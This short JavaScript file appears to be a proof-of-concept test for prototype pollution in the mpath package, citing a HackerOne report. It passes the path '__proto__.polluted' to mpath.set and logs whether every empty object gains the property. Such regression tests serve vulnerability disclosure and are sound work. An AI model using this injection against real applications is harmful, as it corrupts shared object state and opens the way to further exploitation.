// //https://hackerone.com/reports/390860
// test("prototype pollution in mpath ", () => {
  var mpath = require("mpath");

  var obj = {};

console.log({}.polluted);

  mpath.set("__proto__.polluted", "yes", obj);
console.log({}.polluted);
// });
